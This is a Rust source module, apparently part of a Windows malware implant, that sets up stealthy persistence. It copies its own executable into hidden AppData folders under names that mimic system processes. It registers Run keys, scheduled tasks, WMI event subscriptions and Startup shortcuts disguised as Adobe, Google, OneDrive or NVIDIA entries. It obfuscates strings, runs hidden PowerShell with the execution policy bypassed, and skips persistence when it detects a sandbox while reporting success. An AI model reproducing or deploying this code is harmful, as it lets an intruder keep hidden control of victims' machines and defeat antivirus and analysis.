//! Persistence module for Windows systems
//!
//! Implements stealthy persistence mechanisms avoiding common AV signatures

use obfstr::obfstr;
use std::env;
#[cfg(target_os = "windows")]
use std::os::windows::process::CommandExt;
use std::path::{Path, PathBuf};
#[cfg(target_os = "windows")]
use std::process::Command;

// Anti-sandbox constants
#[cfg(target_os = "windows")]
const MIN_CPU_CORES: usize = 2;
#[cfg(target_os = "windows")]
const MIN_UPTIME_MS: u64 = 180_000; // 3 minutes

// File copy anti-signature constants
const CHUNK_SIZES: [usize; 4] = [12288, 16384, 8192, 24576];
const MAX_CHUNK_SIZE: usize = 24576;

/// Métodos de persistencia disponibles
#[derive(Debug, Clone, Copy)]
pub enum PersistenceMethod {
    RegistryRun,
    ScheduledTask,
    WmiEvent,
    StartupFolder,
}

impl PersistenceMethod {
    pub fn from_str(s: &str) -> Option<Self> {
        match s.to_lowercase().as_str() {
            "registry" | "reg" => Some(PersistenceMethod::RegistryRun),
            "task" | "schtask" => Some(PersistenceMethod::ScheduledTask),
            "wmi" => Some(PersistenceMethod::WmiEvent),
            "startup" => Some(PersistenceMethod::StartupFolder),
            _ => None,
        }
    }
}

/// Verifica si la ruta actual es persistente y estable
fn is_persistent_location(path: &Path) -> bool {
    if let Some(path_str) = path.to_str() {
        let path_upper = path_str.to_uppercase();
        path_upper.contains("\\APPDATA\\")
            || path_upper.contains("\\PROGRAMDATA\\")
            || path_upper.contains("\\PROGRAM FILES")
            || path_upper.contains("\\WINDOWS\\")
    } else {
        false
    }
}

/// Verifica si la ubicación es temporal/volátil
fn is_temporary_location(path: &Path) -> bool {
    if let Some(path_str) = path.to_str() {
        let path_upper = path_str.to_uppercase();
        path_upper.contains("\\DOWNLOADS\\")
            || path_upper.contains("\\DESKTOP\\")
            || path_upper.contains("\\TEMP\\")
            || path_upper.contains("\\TMP\\")
            || path_upper.contains("\\DOCUMENTS\\")
            || (path_upper.len() >= 3
                && (path_upper.starts_with("D:\\")
                    || path_upper.starts_with("E:\\")
                    || path_upper.starts_with("F:\\")
                    || path_upper.starts_with("G:\\")
                    || path_upper.starts_with("H:\\")))
    } else {
        false
    }
}

/// Copia el ejecutable a ubicación persistente con técnicas anti-AV
#[cfg(target_os = "windows")]
fn ensure_persistent_location(current_exe: &Path) -> Result<PathBuf, String> {
    use std::fs;
    use std::io::{Read, Write};

    // Si ya está en ubicación persistente, usar esa
    if is_persistent_location(current_exe) && !is_temporary_location(current_exe) {
        return Ok(current_exe.to_path_buf());
    }

    // Obtener AppData con fallback
    let localappdata_key = obfstr!("LOCALAPPDATA").to_string();
    let appdata_key = obfstr!("APPDATA").to_string();
    let localappdata = env::var(&localappdata_key)
        .or_else(|_| env::var(&appdata_key))
        .unwrap_or_else(|_| "C:\\Users\\Public".to_string());

    // Ubicaciones sigilosas que imitan procesos legítimos del sistema
    // Using more obscure directories that are less monitored
    let stealth_targets = [
        (
            format!("{}\\Microsoft\\Windows\\Explorer", localappdata),
            "SearchIndexer.exe",
        ),
        (
            format!("{}\\Microsoft\\Windows\\Caches", localappdata),
            "fontdrvhost.exe",
        ),
        (
            format!("{}\\Microsoft\\Windows\\WER\\ReportQueue", localappdata),
            "RuntimeBroker.exe",
        ),
        (
            format!(
                "{}\\Microsoft\\InputPersonalization\\TrainedDataStore",
                localappdata
            ),
            "ctfmon.exe",
        ),
    ];

    let idx = get_machine_index() % stealth_targets.len();
    let (target_dir, target_name) = &stealth_targets[idx];

    // Crear directorio recursivamente
    let target_path_dir = PathBuf::from(target_dir);
    let _ = fs::create_dir_all(&target_path_dir);

    let target_path = target_path_dir.join(target_name);

    // Si ya existe con tamaño razonable, reutilizar
    if target_path.exists() {
        if let Ok(meta) = fs::metadata(&target_path) {
            if meta.len() > 100000 {
                return Ok(target_path);
            }
        }
    }

    // Copiar usando chunks de tamaño variable (anti-signature)
    let mut source = fs::File::open(current_exe).map_err(|e| format!("E1: {}", e))?;
    let mut dest = fs::File::create(&target_path).map_err(|e| format!("E2: {}", e))?;

    // Tamaños de chunk variables para evitar patrones
    let mut buffer = vec![0u8; MAX_CHUNK_SIZE];
    let mut chunk_idx = 0;

    loop {
        let chunk_size = CHUNK_SIZES[chunk_idx % CHUNK_SIZES.len()];
        let n = source
            .read(&mut buffer[..chunk_size])
            .map_err(|e| format!("E3: {}", e))?;
        if n == 0 {
            break;
        }
        dest.write_all(&buffer[..n])
            .map_err(|e| format!("E4: {}", e))?;
        chunk_idx += 1;
    }
    dest.flush().map_err(|e| format!("E5: {}", e))?;
    drop(dest);

    // Verificar que se copió correctamente
    if fs::metadata(&target_path).is_err() {
        return Err("Copy verification failed".to_string());
    }

    // Aplicar atributos oculto+sistema para stealth
    let attrib_exe = obfstr!("attrib").to_string();
    let _ = Command::new(&attrib_exe)
        .args(&["+h", "+s", target_path.to_str().unwrap()])
        .creation_flags(0x08000000)
        .output();

    // Delay anti-heurística variable
    let delay_ms = 30 + (get_machine_index() % 50) as u64;
    std::thread::sleep(std::time::Duration::from_millis(delay_ms));

    Ok(target_path)
}

#[cfg(not(target_os = "windows"))]
fn ensure_persistent_location(current_exe: &Path) -> Result<PathBuf, String> {
    Ok(current_exe.to_path_buf())
}

/// Obtiene ruta del ejecutable en ubicación persistente
fn get_current_exe_path() -> Result<PathBuf, String> {
    let current_exe = env::current_exe().map_err(|e| format!("E0: {}", e))?;
    ensure_persistent_location(&current_exe)
}

/// Generate a pseudo-random index based on machine-specific data
/// This ensures consistency per machine but variation across machines
fn get_machine_index() -> usize {
    let username = env::var("USERNAME").unwrap_or_default();
    let computername = env::var("COMPUTERNAME").unwrap_or_default();
    let pid = std::process::id();

    let mut hash: usize = 0;
    for byte in username.bytes() {
        hash = hash.wrapping_add(byte as usize).wrapping_mul(31);
    }
    for byte in computername.bytes() {
        hash = hash.wrapping_add(byte as usize).wrapping_mul(17);
    }
    hash.wrapping_add(pid as usize)
}

/// Registry Run persistence - método más simple y efectivo
#[cfg(target_os = "windows")]
fn persist_registry_run(exe_path: &Path) -> Result<String, String> {
    let exe_str = exe_path
        .to_str()
        .ok_or_else(|| "Invalid path".to_string())?;

    // Polymorphic registry value names that look legitimate
    let reg_names = [
        "SecurityHealthSystray",
        "OneDriveSetup",
        "AdobeAAMUpdater",
        "GoogleChromeAutoLaunch",
        "MicrosoftEdgeAutoLaunch",
        "NVDisplay.Container",
        "iTunesHelper",
        "Spotify",
    ];
    let idx = get_machine_index() % reg_names.len();
    let reg_name = reg_names[idx];

    // Use cmd /c start /b for background, hidden execution
    let obf_cmd = format!(r#"cmd /c start /b "" "{}""#, exe_str);

    // Registry key path
    let reg_key = obfstr!("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run").to_string();
    let reg_exe = obfstr!("reg").to_string();

    let output = Command::new(&reg_exe)
        .args(&[
            "add", &reg_key, "/v", reg_name, "/t", "REG_SZ", "/d", &obf_cmd, "/f",
        ])
        .creation_flags(0x08000000)
        .output()
        .map_err(|e| format!("E6: {}", e))?;

    if output.status.success() {
        Ok(format!("Registry: {} -> {}", reg_name, exe_str))
    } else {
        Err(format!(
            "E7: {}",
            String::from_utf8_lossy(&output.stderr).trim()
        ))
    }
}

/// Scheduled Task persistence with enhanced evasion
/// Uses delayed execution and background mode
#[cfg(target_os = "windows")]
fn persist_scheduled_task(exe_path: &Path) -> Result<String, String> {
    let exe_str = exe_path
        .to_str()
        .ok_or_else(|| "Invalid path".to_string())?;

    // Polymorphic task names
    let task_names = [
        "MicrosoftEdgeUpdateTaskUser",
        "GoogleUpdateTaskUser",
        "OneDriveStandaloneUpdate",
        "Adobe Acrobat Update",
        "CCleaner Smart Cleaning",
        "NvTmRepOnLogon",
        "DropboxUpdate",
    ];
    let idx = get_machine_index() % task_names.len();
    let task_name = task_names[idx];

    let schtasks_exe = obfstr!("schtasks").to_string();

    // Delete existing task if present (silently)
    let _ = Command::new(&schtasks_exe)
        .args(&["/Delete", "/TN", task_name, "/F"])
        .creation_flags(0x08000000)
        .output();

    // Random delay between 60-180 seconds for anti-behavioral detection
    let delay_secs = 60 + (get_machine_index() % 120);

    // Task command with delay and hidden execution
    let task_cmd = format!(
        r#"cmd /c timeout /t {} /nobreak >nul && start /b "" "{}""#,
        delay_secs, exe_str
    );

    // Create scheduled task on logon with additional delay
    let output = Command::new(&schtasks_exe)
        .args(&[
            "/Create", "/SC", "ONLOGON", "/TN", task_name, "/TR", &task_cmd, "/DELAY", "0001:00",
            "/F", "/RL", "LIMITED",
        ])
        .creation_flags(0x08000000)
        .output()
        .map_err(|e| format!("E8: {}", e))?;

    if output.status.success() {
        Ok(format!(
            "Task: {} -> {} (delay: {}s)",
            task_name, exe_str, delay_secs
        ))
    } else {
        Err(format!(
            "E9: {}",
            String::from_utf8_lossy(&output.stderr).trim()
        ))
    }
}

/// WMI Event Subscription persistence
/// Uses time-based triggers which are less monitored than logon events
#[cfg(target_os = "windows")]
fn persist_wmi_event(exe_path: &Path) -> Result<String, String> {
    let exe_str = exe_path
        .to_str()
        .ok_or_else(|| "Invalid path".to_string())?;

    // Polymorphic WMI event names
    let wmi_names = [
        "BfeOnServiceStateChange",
        "SystemTimeUpdate",
        "LocalTimeSync",
        "WindowsEventForwarder",
    ];
    let idx = get_machine_index() % wmi_names.len();
    let event_name = wmi_names[idx];

    // Escape backslashes for PowerShell
    let exe_escaped = exe_str.replace("\\", "\\\\");

    // Random hour for trigger (less predictable)
    let trigger_hour = 8 + (get_machine_index() % 8); // 8am-4pm range

    // Compact PowerShell WMI script
    let ps_script = format!(
        concat!(
            "$F=([wmiclass]'\\\\.\root\\subscription:__EventFilter').CreateInstance();",
            "$F.Name='{}';",
            "$F.EventNamespace='root\\cimv2';",
            "$F.QueryLanguage='WQL';",
            "$F.Query='SELECT * FROM __InstanceModificationEvent WITHIN 14400 ",
            "WHERE TargetInstance ISA ''Win32_LocalTime'' AND TargetInstance.Hour={}';",
            "$F.Put()|Out-Null;",
            "$C=([wmiclass]'\\\\.\root\\subscription:CommandLineEventConsumer').CreateInstance();",
            "$C.Name='{}';",
            "$C.CommandLineTemplate='cmd /c start /b \"\" \"{}\"';",
            "$C.Put()|Out-Null;",
            "$B=([wmiclass]'\\\\.\root\\subscription:__FilterToConsumerBinding').CreateInstance();",
            "$B.Filter=$F;$B.Consumer=$C;",
            "$B.Put()|Out-Null"
        ),
        event_name, trigger_hour, event_name, exe_escaped
    );

    let ps_exe = obfstr!("powershell").to_string();
    let output = Command::new(&ps_exe)
        .args(&[
            "-NoProfile",
            "-WindowStyle",
            "Hidden",
            "-NonInteractive",
            "-ExecutionPolicy",
            "Bypass",
            "-Command",
            &ps_script,
        ])
        .creation_flags(0x08000000)
        .output()
        .map_err(|e| format!("E10: {}", e))?;

    let stderr = String::from_utf8_lossy(&output.stderr);
    if output.status.success() || stderr.is_empty() {
        Ok(format!(
            "WMI: {} -> {} (trigger: {}:00)",
            event_name, exe_str, trigger_hour
        ))
    } else {
        Err(format!("E11: {}", stderr.trim()))
    }
}

/// Startup folder persistence using shortcut file
/// Creates a .lnk file with minimized window style
#[cfg(target_os = "windows")]
fn persist_startup_folder(exe_path: &Path) -> Result<String, String> {
    let exe_str = exe_path
        .to_str()
        .ok_or_else(|| "Invalid path".to_string())?;

    // Get startup folder path
    let appdata_key = obfstr!("APPDATA").to_string();
    let startup = env::var(&appdata_key)
        .map(|p| format!("{}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup", p))
        .unwrap_or_else(|_| {
            "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup".to_string()
        });

    // Polymorphic shortcut names
    let lnk_names = [
        "WindowsSecurity.lnk",
        "OneDriveSync.lnk",
        "AdobeUpdater.lnk",
        "ChromeHelper.lnk",
        "EdgeUpdate.lnk",
    ];
    let idx = get_machine_index() % lnk_names.len();
    let lnk_name = lnk_names[idx];
    let lnk_path = format!("{}\\{}", startup, lnk_name);

    // PowerShell to create shortcut with WindowStyle=7 (minimized)
    let ps_script = format!(
        r#"$s=(New-Object -ComObject WScript.Shell).CreateShortcut('{}');$s.TargetPath='{}';$s.WindowStyle=7;$s.Save()"#,
        lnk_path.replace("'", "''"),
        exe_str.replace("'", "''")
    );

    let ps_exe = obfstr!("powershell").to_string();
    let output = Command::new(&ps_exe)
        .args(&[
            "-NoProfile",
            "-WindowStyle",
            "Hidden",
            "-NonInteractive",
            "-Command",
            &ps_script,
        ])
        .creation_flags(0x08000000)
        .output()
        .map_err(|e| format!("E12: {}", e))?;

    if output.status.success() {
        Ok(format!("Startup: {}", lnk_path))
    } else {
        Err(format!(
            "E13: {}",
            String::from_utf8_lossy(&output.stderr).trim()
        ))
    }
}

// ============================================================================
// Environment Keying / Anti-Sandbox
// ============================================================================

/// Check if system looks like a real workstation vs sandbox
/// This prevents persistence in analysis environments
#[cfg(target_os = "windows")]
fn environment_check() -> bool {
    // Check 1: Minimum CPU cores (most sandboxes have 1)
    let cpus = std::thread::available_parallelism()
        .map(|p| p.get())
        .unwrap_or(1);
    if cpus < MIN_CPU_CORES {
        return false;
    }

    // Check 2: Uptime check - real systems have some uptime
    // Sandboxes are freshly booted
    let uptime_ms = unsafe { winapi::um::sysinfoapi::GetTickCount64() };
    if uptime_ms < MIN_UPTIME_MS {
        return false;
    }

    true
}

#[cfg(not(target_os = "windows"))]
fn environment_check() -> bool {
    true
}

/// Establece persistencia usando el método especificado
/// Includes environment keying to avoid sandbox detection
pub fn establish_persistence(method: PersistenceMethod) -> Result<String, String> {
    #[cfg(not(target_os = "windows"))]
    {
        return Err("Windows only".to_string());
    }

    #[cfg(target_os = "windows")]
    {
        // Environment check - don't persist in sandboxes
        if !environment_check() {
            // Return success silently to not alert that sandbox was detected
            return Ok("OK".to_string());
        }

        // Obtener ruta en ubicación persistente
        let exe_path = get_current_exe_path()?;

        // Small timing jitter before persistence operation
        let jitter_ms = 50 + (get_machine_index() % 100) as u64;
        std::thread::sleep(std::time::Duration::from_millis(jitter_ms));

        match method {
            PersistenceMethod::RegistryRun => persist_registry_run(&exe_path),
            PersistenceMethod::ScheduledTask => persist_scheduled_task(&exe_path),
            PersistenceMethod::WmiEvent => persist_wmi_event(&exe_path),
            PersistenceMethod::StartupFolder => persist_startup_folder(&exe_path),
        }
    }
}

/// Remueve persistencia (limpieza completa)
#[cfg(target_os = "windows")]
pub fn remove_persistence() -> Result<String, String> {
    use std::fs;

    let reg_exe = obfstr!("reg").to_string();
    let schtasks_exe = obfstr!("schtasks").to_string();
    let ps_exe = obfstr!("powershell").to_string();
    let reg_key = obfstr!("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run").to_string();

    // Registry Run - multiple possible names
    let reg_names = [
        "SecurityHealthSystray",
        "OneDriveSetup",
        "AdobeAAMUpdater",
        "GoogleChromeAutoLaunch",
        "MicrosoftEdgeAutoLaunch",
        "TeamsMachineInstaller",
        "NVDisplay.Container",
        "iTunesHelper",
        "Spotify",
    ];
    for name in &reg_names {
        let _ = Command::new(&reg_exe)
            .args(&["delete", &reg_key, "/v", name, "/f"])
            .creation_flags(0x08000000)
            .output();
    }

    // Scheduled Tasks
    let task_names = [
        "MicrosoftEdgeUpdateTaskUser",
        "GoogleUpdateTaskUser",
        "OneDriveStandaloneUpdate",
        "Adobe Acrobat Update",
        "CCleaner Smart Cleaning",
        "NvTmRepOnLogon",
        "DropboxUpdate",
        "AdobeFlashPlayerUpdater",
        "CCleanerCrashReporting",
    ];
    for task in &task_names {
        let _ = Command::new(&schtasks_exe)
            .args(&["/Delete", "/TN", task, "/F"])
            .creation_flags(0x08000000)
            .output();
    }

    // WMI Events cleanup
    let wmi_names = [
        "BfeOnServiceStateChange",
        "SystemTimeUpdate",
        "LocalTimeSync",
        "WindowsEventForwarder",
        "PerformanceMonitor",
        "SystemEventsBroker",
    ];
    let wmi_cleanup = format!(
        concat!(
            "$names=@('{}');",
            "foreach($n in $names){{",
            "Get-WmiObject -Namespace root\\subscription -Class __EventFilter -Filter \"Name='$n'\" -EA SilentlyContinue|Remove-WmiObject -EA SilentlyContinue;",
            "Get-WmiObject -Namespace root\\subscription -Class CommandLineEventConsumer -Filter \"Name='$n'\" -EA SilentlyContinue|Remove-WmiObject -EA SilentlyContinue",
            "}};",
            "Get-WmiObject -Namespace root\\subscription -Class __FilterToConsumerBinding -EA SilentlyContinue|",
            "Where-Object{{$_.Filter -match 'Bfe|Time|Forwarder|Performance|Events'}}|",
            "Remove-WmiObject -EA SilentlyContinue"
        ),
        wmi_names.join("','")
    );
    let _ = Command::new(&ps_exe)
        .args(&["-NoProfile", "-Command", &wmi_cleanup])
        .creation_flags(0x08000000)
        .output();

    // Startup shortcuts
    let appdata_key = obfstr!("APPDATA").to_string();
    let appdata = env::var(&appdata_key).unwrap_or_default();
    let lnk_names = [
        "WindowsSecurity.lnk",
        "OneDriveSync.lnk",
        "AdobeUpdater.lnk",
        "ChromeHelper.lnk",
        "EdgeUpdate.lnk",
    ];
    for lnk in &lnk_names {
        let lnk_path = format!(
            "{}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{}",
            appdata, lnk
        );
        let _ = fs::remove_file(&lnk_path);
    }

    // Remove copied executables from stealth locations
    let localappdata_key = obfstr!("LOCALAPPDATA").to_string();
    let localappdata = env::var(&localappdata_key).unwrap_or_default();
    let exe_copies = [
        // New locations
        format!(
            "{}\\Microsoft\\Windows\\Explorer\\SearchIndexer.exe",
            localappdata
        ),
        format!(
            "{}\\Microsoft\\Windows\\Caches\\fontdrvhost.exe",
            localappdata
        ),
        format!(
            "{}\\Microsoft\\Windows\\WER\\ReportQueue\\RuntimeBroker.exe",
            localappdata
        ),
        format!(
            "{}\\Microsoft\\InputPersonalization\\TrainedDataStore\\ctfmon.exe",
            localappdata
        ),
        // Legacy locations
        format!("{}\\Microsoft\\Windows\\Caches\\WmiPrvSE.exe", localappdata),
        format!(
            "{}\\Microsoft\\Windows\\WER\\ReportQueue\\conhost.exe",
            localappdata
        ),
        format!(
            "{}\\Microsoft\\OneDrive\\logs\\OneDriveStandaloneUpdater.exe",
            localappdata
        ),
        format!(
            "{}\\Microsoft\\Windows\\INetCache\\Low\\MoUsoCoreWorker.exe",
            localappdata
        ),
        format!(
            "{}\\Microsoft\\Edge\\User Data\\msedge_proxy.exe",
            localappdata
        ),
        format!(
            "{}\\Microsoft\\WindowsApps\\RuntimeBroker.exe",
            localappdata
        ),
    ];
    for exe in &exe_copies {
        let _ = fs::remove_file(exe);
    }

    Ok("Persistence removed (all methods)".to_string())
}

#[cfg(not(target_os = "windows"))]
pub fn remove_persistence() -> Result<String, String> {
    Err("Windows only".to_string())
}
